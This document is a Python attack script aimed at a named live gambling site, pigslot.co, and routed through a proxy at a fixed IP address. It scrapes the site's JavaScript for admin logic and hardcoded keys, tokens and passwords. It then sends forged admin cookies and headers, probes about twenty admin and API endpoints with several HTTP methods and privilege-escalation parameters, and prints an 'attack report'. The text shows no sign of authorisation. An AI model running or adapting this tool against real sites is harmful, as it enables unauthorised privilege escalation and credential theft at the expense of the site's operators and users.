#!/usr/bin/env python3

import requests
import urllib3
import json
import re
import time
import base64
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
TARGET_URL = "https://pigslot.co/"
ADMIN_ENDPOINT = "https://pigslot.co/admin-force"

PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")
def print_critical(message): print(f"\033[1;35m[!!!] {message}\033[0m")

class ClientSideAdminLogicTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = PROXIES
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.admin_logic_findings = []
        self.js_files = []
        self.exposed_logic = {}
        
    def analyze_admin_force_logic(self):
        """Deep analysis of client-side admin logic in admin-force endpoint"""
        print_critical("🔍 ANALYZING CLIENT-SIDE ADMIN LOGIC EXPOSURE")
        print_info("=" * 70)
        
        try:
            # Get the admin-force page
            response = self.session.get(ADMIN_ENDPOINT, timeout=10)
            content = response.text
            
            print_success(f"✅ Admin-force page accessible: {response.status_code}")
            print_info(f"Content length: {len(content)} bytes")
            
            # Extract JavaScript file URLs
            js_patterns = [
                r'/_next/static/chunks/[^"]+\.js',
                r'/static/js/[^"]+\.js',
                r'src="([^"]+\.js)"',
                r"src='([^']+\.js)'"
            ]
            
            all_js_files = set()
            for pattern in js_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    if match.startswith('/'):
                        all_js_files.add(urljoin(TARGET_URL, match))
                    elif match.startswith('http'):
                        all_js_files.add(match)
            
            self.js_files = list(all_js_files)
            print_success(f"✅ Found {len(self.js_files)} JavaScript files")
            
            return True
            
        except Exception as e:
            print_error(f"Error analyzing admin-force: {e}")
            return False
    
    def download_and_analyze_js_files(self):
        """Download and analyze JavaScript files for admin logic"""
        print_critical("📥 DOWNLOADING & ANALYZING JAVASCRIPT FILES")
        print_info("=" * 70)
        
        admin_logic_patterns = [
            # Admin function patterns
            r'function\s+([a-zA-Z_$][a-zA-Z0-9_$]*Admin[a-zA-Z0-9_$]*)',
            r'([a-zA-Z_$][a-zA-Z0-9_$]*Admin[a-zA-Z0-9_$]*)\s*[:=]\s*function',
            r'admin\s*:\s*function',
            r'isAdmin\s*[:=]',
            r'adminMode\s*[:=]',
            r'adminPanel\s*[:=]',
            
            # Admin state patterns
            r'["\']admin["\'].*?true',
            r'admin.*?state',
            r'F\.ADMIN',
            r'ADMIN.*?true',
            r'setAdmin',
            r'admin.*?cookies?',
            
            # Admin API patterns
            r'/api/admin[^"\']*',
            r'admin.*?endpoint',
            r'admin.*?url',
            r'adminAPI',
            
            # Admin privilege patterns
            r'privilege.*?admin',
            r'admin.*?privilege',
            r'hasAdminAccess',
            r'checkAdmin',
            r'validateAdmin',
            
            # Admin UI/Component patterns
            r'AdminPanel',
            r'AdminDashboard',
            r'AdminComponent',
            r'admin.*?component',
            
            # Admin authentication patterns
            r'adminAuth',
            r'admin.*?token',
            r'admin.*?session',
            r'admin.*?login'
        ]
        
        for i, js_url in enumerate(self.js_files):
            try:
                print_info(f"📁 Analyzing file {i+1}/{len(self.js_files)}: {js_url}")
                
                # Download JavaScript file
                response = self.session.get(js_url, timeout=10)
                if response.status_code != 200:
                    print_warning(f"❌ Failed to download: {response.status_code}")
                    continue
                
                js_content = response.text
                print_info(f"   File size: {len(js_content)} bytes")
                
                # Analyze for admin logic patterns
                file_findings = []
                for pattern in admin_logic_patterns:
                    matches = re.findall(pattern, js_content, re.IGNORECASE)
                    if matches:
                        file_findings.extend(matches)
                        print_success(f"   ✅ Pattern '{pattern}': {len(matches)} matches")
                        
                        # Show first few matches
                        for match in matches[:3]:
                            if isinstance(match, str) and len(match) > 0:
                                print_info(f"      → {match}")
                
                # Look for specific admin-related functions/variables
                admin_keywords = [
                    'AdminForce', 'adminForce', 'ADMIN_FORCE',
                    'isAdmin', 'setAdmin', 'adminMode', 'adminPanel',
                    'hasAdminPrivileges', 'checkAdminAccess', 'adminState',
                    'F.ADMIN', 'a.F.ADMIN', 'adminCookies', 'adminToken'
                ]
                
                for keyword in admin_keywords:
                    if keyword in js_content:
                        print_success(f"   🎯 Found admin keyword: '{keyword}'")
                        file_findings.append(keyword)
                        
                        # Get context around the keyword
                        keyword_pos = js_content.find(keyword)
                        if keyword_pos != -1:
                            start = max(0, keyword_pos - 100)
                            end = min(len(js_content), keyword_pos + 100)
                            context = js_content[start:end]
                            print_info(f"      Context: ...{context}...")
                
                if file_findings:
                    self.exposed_logic[js_url] = file_findings
                    print_success(f"   🚨 ADMIN LOGIC EXPOSED in {js_url}")
                else:
                    print_info(f"   ✅ No admin logic found in {js_url}")
                    
            except Exception as e:
                print_error(f"   ❌ Error analyzing {js_url}: {e}")
                
        return len(self.exposed_logic) > 0
    
    def test_admin_logic_manipulation(self):
        """Test if exposed admin logic can be manipulated"""
        print_critical("🔧 TESTING ADMIN LOGIC MANIPULATION")
        print_info("=" * 70)
        
        manipulation_tests = []
        
        # Test 1: Direct admin state manipulation via console
        print_info("🧪 Test 1: Browser Console Admin State Manipulation")
        console_payloads = [
            "window.adminState = true;",
            "localStorage.setItem('admin', 'true');",
            "sessionStorage.setItem('isAdmin', 'true');",
            "document.cookie = 'admin=true; path=/';",
            "window.isAdmin = true;",
            "window.adminMode = true;",
            "if(window.F) window.F.ADMIN = true;",
            "if(window.a && window.a.F) window.a.F.ADMIN = true;"
        ]
        
        for payload in console_payloads:
            print_info(f"   Testing payload: {payload}")
            # Note: This would require browser automation to test properly
            # For now, we document the potential attack vector
            manipulation_tests.append({
                'type': 'console_injection',
                'payload': payload,
                'risk': 'Client-side state manipulation possible',
                'impact': 'Potential UI changes, but no server-side impact without validation'
            })
        
        # Test 2: Local Storage manipulation
        print_info("🧪 Test 2: Local Storage Admin Flags")
        storage_tests = [
            "localStorage.setItem('admin', 'true')",
            "localStorage.setItem('isAdmin', '1')",
            "localStorage.setItem('adminMode', 'enabled')",
            "localStorage.setItem('userRole', 'admin')",
            "sessionStorage.setItem('admin', 'true')"
        ]
        
        for test in storage_tests:
            manipulation_tests.append({
                'type': 'storage_manipulation',
                'payload': test,
                'risk': 'Local storage admin flags can be set',
                'impact': 'May affect client-side behavior and UI'
            })
        
        # Test 3: Cookie manipulation
        print_info("🧪 Test 3: Cookie-based Admin Flags")
        cookie_tests = [
            "admin=true",
            "isAdmin=1",
            "userRole=admin",
            "adminMode=enabled",
            "privileges=admin"
        ]
        
        for cookie in cookie_tests:
            try:
                # Test setting admin cookies
                self.session.cookies.set(*cookie.split('=', 1))
                response = self.session.get(TARGET_URL, timeout=5)
                
                manipulation_tests.append({
                    'type': 'cookie_manipulation',
                    'payload': cookie,
                    'risk': f'Cookie set successfully: {cookie}',
                    'impact': 'May affect server-side admin checks',
                    'response_code': response.status_code
                })
                
                print_info(f"   Cookie test '{cookie}': {response.status_code}")
                
            except Exception as e:
                print_warning(f"   Cookie test failed: {e}")
        
        return manipulation_tests
    
    def test_admin_endpoints_with_logic(self):
        """Test admin endpoints after client-side logic manipulation"""
        print_critical("🌐 TESTING ADMIN ENDPOINTS WITH MANIPULATED STATE")
        print_info("=" * 70)
        
        # Set various admin-related headers and cookies
        admin_headers = {
            'X-Admin': 'true',
            'X-Is-Admin': '1',
            'X-Admin-Mode': 'enabled',
            'X-User-Role': 'admin',
            'X-Privileges': 'admin',
            'Admin': 'true',
            'Role': 'admin'
        }
        
        admin_cookies = {
            'admin': 'true',
            'isAdmin': '1',
            'userRole': 'admin',
            'adminMode': 'enabled',
            'privileges': 'admin'
        }
        
        # Update session with admin headers and cookies
        self.session.headers.update(admin_headers)
        for name, value in admin_cookies.items():
            self.session.cookies.set(name, value)
        
        # Test various admin endpoints
        admin_endpoints = [
            '/admin',
            '/admin/',
            '/admin/dashboard',
            '/admin/panel',
            '/admin/users',
            '/admin/settings',
            '/admin/config',
            '/dashboard',
            '/panel',
            '/management',
            '/api/admin',
            '/api/admin/users',
            '/api/admin/dashboard',
            '/api/admin/config',
            '/api/admin/settings',
            '/api/user/admin',
            '/api/auth/admin',
            '/graphql/admin',
            '/v1/admin',
            '/admin/api',
            '/admin/graphql'
        ]
        
        endpoint_results = {}
        
        for endpoint in admin_endpoints:
            try:
                url = urljoin(TARGET_URL, endpoint)
                
                # Try different HTTP methods
                for method in ['GET', 'POST', 'PUT', 'PATCH']:
                    try:
                        if method == 'GET':
                            response = self.session.get(url, timeout=5)
                        elif method == 'POST':
                            response = self.session.post(url, json={'admin': True}, timeout=5)
                        elif method == 'PUT':
                            response = self.session.put(url, json={'admin': True}, timeout=5)
                        elif method == 'PATCH':
                            response = self.session.patch(url, json={'admin': True}, timeout=5)
                        
                        if response.status_code not in [404, 405]:
                            endpoint_results[f"{method} {endpoint}"] = {
                                'status_code': response.status_code,
                                'content_length': len(response.text),
                                'content_type': response.headers.get('content-type', ''),
                                'response_sample': response.text[:200]
                            }
                            
                            if response.status_code == 200:
                                print_success(f"   ✅ {method} {endpoint}: {response.status_code}")
                                
                                # Check for admin content
                                content_lower = response.text.lower()
                                admin_indicators = ['admin', 'dashboard', 'users', 'settings', 'management', 'config']
                                found_indicators = [ind for ind in admin_indicators if ind in content_lower]
                                
                                if found_indicators:
                                    print_critical(f"      🚨 POTENTIAL ADMIN ACCESS: Contains {found_indicators}")
                                    endpoint_results[f"{method} {endpoint}"]['admin_indicators'] = found_indicators
                            else:
                                print_info(f"   {method} {endpoint}: {response.status_code}")
                        
                    except requests.exceptions.Timeout:
                        print_warning(f"   ⏰ {method} {endpoint}: Timeout")
                    except Exception as e:
                        continue
                        
            except Exception as e:
                print_error(f"   ❌ Error testing {endpoint}: {e}")
        
        return endpoint_results
    
    def test_api_parameter_manipulation(self):
        """Test API endpoints with admin parameters"""
        print_critical("📡 TESTING API PARAMETER MANIPULATION")
        print_info("=" * 70)
        
        api_endpoints = [
            '/api/auth/login',
            '/api/auth/register',
            '/api/auth/validate',
            '/api/user/profile',
            '/api/user/update',
            '/api/users',
            '/api/me',
            '/api/data',
            '/api/config',
            '/api/settings'
        ]
        
        admin_parameters = [
            {'admin': True},
            {'isAdmin': True},
            {'role': 'admin'},
            {'userRole': 'admin'},
            {'privileges': 'admin'},
            {'adminMode': True},
            {'admin': 1},
            {'is_admin': True},
            {'user_role': 'admin'},
            {'force_admin': True}
        ]
        
        parameter_results = {}
        
        for endpoint in api_endpoints:
            for params in admin_parameters:
                try:
                    url = urljoin(TARGET_URL, endpoint)
                    
                    # Test with GET parameters
                    response = self.session.get(url, params=params, timeout=5)
                    if response.status_code not in [404, 405]:
                        key = f"GET {endpoint} + {params}"
                        parameter_results[key] = {
                            'status_code': response.status_code,
                            'response_length': len(response.text)
                        }
                        print_info(f"   GET {endpoint} with {params}: {response.status_code}")
                    
                    # Test with POST JSON
                    response = self.session.post(url, json=params, timeout=5)
                    if response.status_code not in [404, 405]:
                        key = f"POST {endpoint} + {params}"
                        parameter_results[key] = {
                            'status_code': response.status_code,
                            'response_length': len(response.text)
                        }
                        print_info(f"   POST {endpoint} with {params}: {response.status_code}")
                        
                        # Check for successful admin parameter acceptance
                        if response.status_code == 200:
                            try:
                                json_resp = response.json()
                                if any(key in str(json_resp).lower() for key in ['admin', 'privilege', 'role']):
                                    print_critical(f"      🚨 API ACCEPTS ADMIN PARAMETERS: {params}")
                                    parameter_results[key]['admin_response'] = True
                            except:
                                pass
                    
                except Exception as e:
                    continue
        
        return parameter_results
    
    def analyze_javascript_for_secrets(self):
        """Look for hardcoded secrets or credentials in JavaScript"""
        print_critical("🔐 ANALYZING JAVASCRIPT FOR SECRETS & CREDENTIALS")
        print_info("=" * 70)
        
        secret_patterns = [
            # API Keys
            r'["\']api[_-]?key["\']:\s*["\']([^"\']{10,})["\']',
            r'["\']apikey["\']:\s*["\']([^"\']{10,})["\']',
            r'["\']key["\']:\s*["\']([^"\']{10,})["\']',
            
            # Tokens
            r'["\']token["\']:\s*["\']([^"\']{10,})["\']',
            r'["\']auth[_-]?token["\']:\s*["\']([^"\']{10,})["\']',
            r'["\']access[_-]?token["\']:\s*["\']([^"\']{10,})["\']',
            
            # Admin credentials
            r'["\']admin[_-]?pass(?:word)?["\']:\s*["\']([^"\']+)["\']',
            r'["\']admin[_-]?user(?:name)?["\']:\s*["\']([^"\']+)["\']',
            r'["\']admin[_-]?secret["\']:\s*["\']([^"\']+)["\']',
            
            # Database
            r'["\']db[_-]?pass(?:word)?["\']:\s*["\']([^"\']+)["\']',
            r'["\']database[_-]?url["\']:\s*["\']([^"\']+)["\']',
            
            # General secrets
            r'["\']secret["\']:\s*["\']([^"\']{8,})["\']',
            r'["\']password["\']:\s*["\']([^"\']+)["\']'
        ]
        
        secrets_found = {}
        
        for js_url in self.js_files:
            try:
                response = self.session.get(js_url, timeout=10)
                if response.status_code == 200:
                    js_content = response.text
                    
                    file_secrets = []
                    for pattern in secret_patterns:
                        matches = re.findall(pattern, js_content, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                if len(match) > 3:  # Filter out very short matches
                                    file_secrets.append({
                                        'pattern': pattern,
                                        'value': match,
                                        'type': 'potential_secret'
                                    })
                                    print_critical(f"   🚨 POTENTIAL SECRET in {js_url}: {match}")
                    
                    if file_secrets:
                        secrets_found[js_url] = file_secrets
                        
            except Exception as e:
                print_error(f"   ❌ Error analyzing {js_url}: {e}")
        
        return secrets_found
    
    def generate_attack_report(self, manipulation_tests, endpoint_results, parameter_results, secrets_found):
        """Generate comprehensive attack report"""
        print_critical("📊 GENERATING COMPREHENSIVE ATTACK REPORT")
        print_info("=" * 70)
        
        # Calculate risk scores
        total_exposed_files = len(self.exposed_logic)
        total_manipulation_vectors = len(manipulation_tests)
        accessible_endpoints = len([r for r in endpoint_results.values() if r['status_code'] == 200])
        working_parameters = len([r for r in parameter_results.values() if r['status_code'] == 200])
        secrets_count = sum(len(s) for s in secrets_found.values())
        
        # Determine actual CVSS score based on findings
        base_score = 3.0  # Base score for information disclosure
        
        if total_exposed_files > 0:
            base_score += 1.0  # Admin logic exposed
        
        if total_manipulation_vectors > 5:
            base_score += 1.0  # Multiple manipulation vectors
            
        if accessible_endpoints > 0:
            base_score += 2.0  # Accessible admin endpoints
            
        if working_parameters > 0:
            base_score += 1.5  # Admin parameters accepted
            
        if secrets_count > 0:
            base_score += 2.0  # Secrets exposed
        
        final_cvss = min(base_score, 10.0)
        
        # Determine severity
        if final_cvss >= 7.0:
            severity = "HIGH"
            color = "🔴"
        elif final_cvss >= 4.0:
            severity = "MEDIUM"
            color = "🟡"
        else:
            severity = "LOW"
            color = "🟢"
        
        print_success("=" * 70)
        print_critical("🎯 CLIENT-SIDE ADMIN LOGIC EXPOSURE - FINAL ASSESSMENT")
        print_success("=" * 70)
        
        print_info(f"📁 JavaScript Files Analyzed: {len(self.js_files)}")
        print_info(f"🚨 Files with Admin Logic Exposed: {total_exposed_files}")
        print_info(f"🔧 Manipulation Vectors Found: {total_manipulation_vectors}")
        print_info(f"🌐 Accessible Admin Endpoints: {accessible_endpoints}")
        print_info(f"📡 Working Admin Parameters: {working_parameters}")
        print_info(f"🔐 Potential Secrets Found: {secrets_count}")
        
        print_success(f"{color} CVSS Score: {final_cvss:.1f} ({severity})")
        
        if final_cvss >= 7.0:
            print_critical("🚨 HIGH RISK CONFIRMED - IMMEDIATE ACTION REQUIRED")
        elif final_cvss >= 4.0:
            print_warning("⚠️ MEDIUM RISK - SHOULD BE ADDRESSED")
        else:
            print_success("✅ LOW RISK - MINIMAL SECURITY IMPACT")
        
        return {
            'cvss_score': final_cvss,
            'severity': severity,
            'exposed_files': total_exposed_files,
            'manipulation_vectors': total_manipulation_vectors,
            'accessible_endpoints': accessible_endpoints,
            'working_parameters': working_parameters,
            'secrets_found': secrets_count,
            'detailed_findings': {
                'exposed_logic': self.exposed_logic,
                'manipulation_tests': manipulation_tests,
                'endpoint_results': endpoint_results,
                'parameter_results': parameter_results,
                'secrets_found': secrets_found
            }
        }

def main():
    print_critical("🎯 CLIENT-SIDE ADMIN LOGIC EXPOSURE TESTER")
    print_info("Target: https://pigslot.co")
    print_info("=" * 70)
    
    tester = ClientSideAdminLogicTester()
    
    # Step 1: Analyze admin-force logic
    if not tester.analyze_admin_force_logic():
        print_error("❌ Failed to analyze admin-force logic")
        return
    
    # Step 2: Download and analyze JavaScript files
    if not tester.download_and_analyze_js_files():
        print_warning("⚠️ No admin logic found in JavaScript files")
    
    # Step 3: Test admin logic manipulation
    manipulation_tests = tester.test_admin_logic_manipulation()
    
    # Step 4: Test admin endpoints with manipulated state
    endpoint_results = tester.test_admin_endpoints_with_logic()
    
    # Step 5: Test API parameter manipulation
    parameter_results = tester.test_api_parameter_manipulation()
    
    # Step 6: Analyze JavaScript for secrets
    secrets_found = tester.analyze_javascript_for_secrets()
    
    # Step 7: Generate comprehensive report
    final_report = tester.generate_attack_report(
        manipulation_tests, endpoint_results, parameter_results, secrets_found
    )
    
    return final_report

if __name__ == "__main__":
    report = main()